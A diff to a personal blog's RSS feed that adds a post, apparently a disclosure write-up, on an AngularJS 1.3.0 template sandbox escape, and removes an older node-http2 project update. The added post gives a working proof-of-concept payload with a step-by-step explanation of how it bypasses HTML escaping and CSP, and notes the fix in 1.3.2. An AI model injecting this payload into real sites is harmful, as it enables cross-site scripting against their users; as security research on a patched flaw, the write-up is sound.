@@ -5,9 +5,150 @@
     <description>Write your site description here. It will be used as your sites meta description as well!</description>
     <link>http://gabor.molnar.es/</link>
     <atom:link href="http://gabor.molnar.es/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 24 Jul 2015 12:43:46 +0200</pubDate>
-    <lastBuildDate>Fri, 24 Jul 2015 12:43:46 +0200</lastBuildDate>
+    <pubDate>Sat, 25 Jul 2015 14:44:54 +0200</pubDate>
+    <lastBuildDate>Sat, 25 Jul 2015 14:44:54 +0200</lastBuildDate>
     <generator>Jekyll v2.5.3</generator>
+    
+      <item>
+        <title>An AngularJS Template Expression Sandbox Escape</title>
+        <description>&lt;h2&gt;Short Proof of Concept&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0/angular.js&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ng-app&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    {{
+    !ready &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (ready = true) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (
+      !call
+      ? $$watchers[0].get(toString.constructor.prototype)
+      : (a = apply) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+        (apply = constructor) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+        (valueOf = call) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+        (&amp;#39;&amp;#39;+&amp;#39;&amp;#39;.toString(
+          &amp;#39;F = Function.prototype;&amp;#39; +
+          &amp;#39;F.apply = F.a;&amp;#39; +
+          &amp;#39;delete F.a;&amp;#39; +
+          &amp;#39;delete F.valueOf;&amp;#39; +
+          &amp;#39;alert(42);&amp;#39;
+        ))
+    );
+    }}
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;See also on jsfiddle &lt;a href=&quot;http://jsfiddle.net/cm7n1ug4/3/&quot;&gt;with HTML entities escaping&lt;/a&gt; and &lt;a href=&quot;http://jsfiddle.net/uesh50vo/&quot;&gt;without escaping&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2&gt;AngularJS Template Expression Sandbox Escapes in General&lt;/h2&gt;
+
+&lt;p&gt;AngularJS has a rich client side templating system that accepts JavaScript expressions wrapped in double curly braces (mustache style templating). The template code is interpreted by an interpreter written in JS itself, and prevents the template code from accessing the DOM, and sensitive objects and functions (&lt;code&gt;eval()&lt;/code&gt;, &lt;code&gt;Function()&lt;/code&gt;, &lt;code&gt;bind()&lt;/code&gt;, &lt;code&gt;apply()&lt;/code&gt;, &lt;code&gt;call()&lt;/code&gt; etc.) that would allow arbitrary JS execution.&lt;/p&gt;
+
+&lt;p&gt;Bugs in this sandbox mechanism can lead to XSS when mixing client side and server side templating like this:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ng-app&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php echo $username; ?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;But why would you want to trick the sandboxing code when you can simply create a &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag just like in a regular XSS without much hassle? The answer is that you can bypass XSS protection mechanisms like these:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;?php echo htmlentities($username) ?&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;?php echo htmlspecialchars($username) ?&amp;gt;&lt;/code&gt; won&amp;#39;t help this time. It prevents creating HTML tags, but the JS template code will be interpreted and sandbox escape will still work.&lt;/li&gt;
+&lt;li&gt;It bypasses a strict &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/CSP&quot;&gt;Content Security Policy&lt;/a&gt; defined to prevent XSS attack. In this case, no &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags are created, the code is executed by Angular. &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;See also: &lt;a href=&quot;https://code.google.com/p/mustache-security/wiki/AngularJS#Sandbox_Bypasses&quot;&gt;AngularJS sandbox escapes on the Mustache Security Wiki&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;Bugs Abused&lt;/h2&gt;
+
+&lt;p&gt;The sandbox bypass abuses three bugs:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;It is possible to access the Function prototype as
+&lt;code&gt;toString.constructor.prototype&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;$$watchers&lt;/code&gt; array is exposed on the scope and this makes it possible
+to call the template recursively with a given new scope.&lt;/li&gt;
+&lt;li&gt;When the scope is &lt;code&gt;Function.prototype&lt;/code&gt;, &lt;code&gt;apply&lt;/code&gt;, &lt;code&gt;bind&lt;/code&gt; and &lt;code&gt;call&lt;/code&gt; are
+all accessible and overwriteable (but not callable).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;(1) is actually not new and was used in previous sandbox escapes as well,
+but it seems like it was not fixed. I believe that (2) and (3) are new.&lt;/p&gt;
+
+&lt;h2&gt;Detailed Explanation&lt;/h2&gt;
+
+&lt;p&gt;The first line ensures that the expression evaluates at most once per scope.
+This is needed only to avoid the payload JS code from executing more than
+once.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    !ready &amp;amp;&amp;amp; (ready = true) &amp;amp;&amp;amp; (
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The whole payload will execute in two different contexts: first with the
+original one, and later with &lt;code&gt;Function.prototype&lt;/code&gt;. The following conditional
+expression separates the code that should be executed in the main context
+and the other context. We assume that &lt;code&gt;call&lt;/code&gt; is only defined in the function
+prototype context, so the main context code is the first branch and the
+function prototype code is the second branch.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;      !call
+      ? ...
+      : ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The main context code runs first. It calls the template recursively with
+&lt;code&gt;Function.prototype&lt;/code&gt; as context. It is made possible by the exposed
+&lt;code&gt;$$watchers[0].get&lt;/code&gt; function which evaluates the current template with a
+given scope. &lt;code&gt;Function.prototype&lt;/code&gt; is not accessible directly, but we can use
+&lt;code&gt;toString.constructor.prototype&lt;/code&gt; instead.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;      ? $$watchers[0].get(toString.constructor.prototype)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The following lines evaluate only when the context is &lt;code&gt;Function.prototype&lt;/code&gt;.
+The first line saves a reference to &lt;code&gt;apply&lt;/code&gt; to temporary variable on the
+scope.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;      : (a = apply) &amp;amp;&amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The next two lines is equivalent to &lt;code&gt;Function.prototype.apply = Function&lt;/code&gt; and
+&lt;code&gt;Function.prototype.valueOf = Function.prototype.call&lt;/code&gt;. These will be used
+for tricking Angular into instantiating and calling a function for us in the
+next step.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;        (apply = constructor) &amp;amp;&amp;amp;
+        (valueOf = call) &amp;amp;&amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The following line first triggers the creation of a function with the code
+given as argument to the &lt;code&gt;toString&lt;/code&gt; method and then calls the method:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;        (&amp;#39;&amp;#39;+&amp;#39;&amp;#39;.toString(&amp;#39;js code&amp;#39;))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;When interpreting &lt;code&gt;&amp;#39;&amp;#39;.toString( ... )&lt;/code&gt;, Angular actually uses &lt;code&gt;apply&lt;/code&gt; to
+invoke the method. With this in mind, and considering the previously
+overwritten methods, the previous line is equivalent to these:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;        (&amp;#39;&amp;#39;+toString.apply(&amp;#39;&amp;#39;, [&amp;#39;js code&amp;#39;]))
+        (&amp;#39;&amp;#39;+Function.prototype.apply.call(toString, &amp;#39;&amp;#39;, [&amp;#39;js code&amp;#39;]))
+        (&amp;#39;&amp;#39;+Function(&amp;#39;&amp;#39;, [&amp;#39;js code&amp;#39;]))
+        (&amp;#39;&amp;#39;+Function(&amp;#39;&amp;#39;, &amp;#39;js code&amp;#39;))
+        (&amp;#39;&amp;#39;+function() { js code })
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The newly created function will be converted to string because of the &amp;#39;+&amp;#39;
+operator, and as part of this process, the previously overwritten &lt;code&gt;valueOf&lt;/code&gt;
+method is called:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;        (&amp;#39;&amp;#39;+function() { js code }.valueOf())
+        (&amp;#39;&amp;#39;+function() { js code }.call())
+        (&amp;#39;&amp;#39;+eval(&amp;#39;js code&amp;#39;))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The actual JS code first restores every change to the Function class:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;          &amp;#39;F = Function.prototype;&amp;#39; +
+          &amp;#39;F.apply = F.a;&amp;#39; +
+          &amp;#39;delete F.a;&amp;#39; +
+          &amp;#39;delete F.valueOf;&amp;#39; +
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and the executes the main payload:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;          &amp;#39;alert(42);&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Acknowledgements&lt;/h2&gt;
+
+&lt;p&gt;Thanks for &lt;a href=&quot;https://twitter.com/avlidienbrunn&quot;&gt;Mathias Karlsson&lt;/a&gt; for inspiring this work with his &lt;a href=&quot;https://twitter.com/avlidienbrunn/status/513978256790663168&quot;&gt;previous sandbox escape&lt;/a&gt;, and the AngularJS team for quickly fixing the vulnerability. The fix has been released as part of &lt;a href=&quot;https://github.com/angular/angular.js/blob/master/CHANGELOG.md#132-cardiovasculatory-magnification-2014-11-07&quot;&gt;AngularJS 1.3.2&lt;/a&gt;.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 09 Nov 2014 00:00:00 +0100</pubDate>
+        <link>http://gabor.molnar.es/blog/2014/11/09/angularjs-sandbox-escape/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2014/11/09/angularjs-sandbox-escape/</guid>
+        
+        
+      </item>
     
       <item>
         <title>UCSB iCTF 2013 - The Uranus service</title>
@@ -650,61 +791,6 @@ Your code has runtime errors: ReferenceError: require is not defined
         <pubDate>Mon, 12 Aug 2013 22:36:00 +0200</pubDate>
         <link>http://gabor.molnar.es/blog/2013/08/12/gsoc-week-number-8/</link>
         <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/08/12/gsoc-week-number-8/</guid>
-        
-        
-        <category>google summer of code</category>
-        
-      </item>
-    
-      <item>
-        <title>GSoC week #6 and #7</title>
-        <description>&lt;p&gt;This is the summary of the sixth and seventh week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
-
-&lt;!-- more --&gt;
-
-&lt;p&gt;The summary for the sixth week is short: I&amp;#39;ve had summer holiday :) Next week marked a quite big milestone for the project: having a public API and launching a public test server!&lt;/p&gt;
-
-&lt;p&gt;The public API is very similar to the &lt;a href=&quot;http://nodejs.org/api/https.html&quot;&gt;standard node.js HTTPS API&lt;/a&gt;. The goal is to achieve perfect API compatibility, and to add HTTP/2 related stuff as extension to the API. Currently, there&amp;#39;s o public API for server push, but that&amp;#39;s probably coming this week.&lt;/p&gt;
-
-&lt;p&gt;A short example of using node-http2 as client:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;http2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http2&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;http2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;gabor.molnar.es&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;rejectUnauthorized&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;response&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Using as server:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;http2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http2&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readFileSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;./example/localhost.key&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readFileSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;./example/localhost.crt&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;http2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Simple isn&amp;#39;t it?&lt;/p&gt;
-
-&lt;p&gt;I&amp;#39;ve also set up a public server at &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;https://gabor.molnar.es:8080&lt;/a&gt;. This serves up the same content (the blog) as the main server at port 80, but it is possible to negotiate HTTP/2 using the TLS NPN extension (no ALPN support yet). If the client does not support HTTP/2 then it falls back to simple HTTPS, so you should be able to see the served content even if the client does not support HTTP/2 yet!&lt;/p&gt;
-
-&lt;p&gt;That&amp;#39;s it for now. I decided to use GitHub issues to maintain a TODO list, so have a look at the &lt;a href=&quot;https://github.com/molnarg/node-http2/issues&quot;&gt;issues page&lt;/a&gt; if you want to se what&amp;#39;s ahead. Please open an issue or &lt;a href=&quot;mailto:gabor@molnar.es&quot;&gt;email me&lt;/a&gt; directly if you find issues while testing.&lt;/p&gt;
-
-&lt;p&gt;As usual, the latest code is published on npm (just type &lt;code&gt;npm install http2&lt;/code&gt; to install it), and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt; was updated as well.&lt;/p&gt;
-</description>
-        <pubDate>Mon, 05 Aug 2013 23:01:00 +0200</pubDate>
-        <link>http://gabor.molnar.es/blog/2013/08/05/gsoc-week-number-6-and-number-7/</link>
-        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/08/05/gsoc-week-number-6-and-number-7/</guid>
         
         
         <category>google summer of code</category>
